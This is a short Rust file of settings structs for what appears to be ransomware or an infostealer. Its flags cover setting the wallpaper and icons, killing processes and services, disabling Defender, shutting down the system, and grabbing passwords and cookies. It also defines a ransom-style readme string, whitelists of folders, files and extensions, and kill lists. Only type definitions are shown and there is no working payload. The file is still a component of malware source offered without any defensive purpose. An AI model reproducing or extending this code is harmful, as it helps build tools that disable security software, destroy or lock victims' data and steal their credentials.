
use std::{
	env,
	io
};
// use serde::Deserialize;

// #[derive(Deserialize)]
pub struct Settings {
	pub config : Config,
	pub white_list : Whitelist,
	pub kill : Kill,
	pub readme : String,
}

pub struct Config {
	pub set_wallpaper 		: bool,
	pub set_icons 			: bool,
	pub skip_hidden_folders : bool,
	pub kill_processes 		: bool,
	pub kill_services  		: bool,
	pub kill_defender  		: bool,
	pub shutdown_system 	: bool,
	pub get_passwrod		: bool,
	pub get_cookies			: bool,
}

pub struct Whitelist {
	pub folder : Vec<String>,
	pub files  :  Vec<String>,
	pub extens : Vec<String> 
}

pub struct Kill {
	pub process : Vec<String>,
	pub services : Vec<String>,
	pub kill_files : Vec<String>,
}